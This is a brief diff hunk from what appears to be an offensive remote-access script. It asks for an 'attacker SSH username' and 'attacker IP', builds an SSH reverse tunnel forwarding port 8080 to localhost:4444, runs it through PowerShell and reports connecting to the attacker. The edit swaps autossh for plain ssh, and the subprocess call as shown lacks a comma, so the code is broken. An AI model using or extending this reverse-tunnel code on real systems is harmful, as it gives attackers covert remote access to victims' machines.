@@ -133,7 +133,7 @@ while True:
         sshuser=input("Enter attacker SSH username: ")
         userip=input("Enter attacker IP (without port): ")
         
-        ssh_tunnel="autossh -M 0 -R 8080:localhost:4444 "+sshuser+"@"+userip
+        ssh_tunnel="ssh -R 8080:localhost:4444 "+sshuser+"@"+userip
         subprocess.run(["powershell", "-Command", ssh_tunnel] check=True)
         cls()
         print(Fore.YELLOW + "Attempting to connect to attacker on " + sshuser)
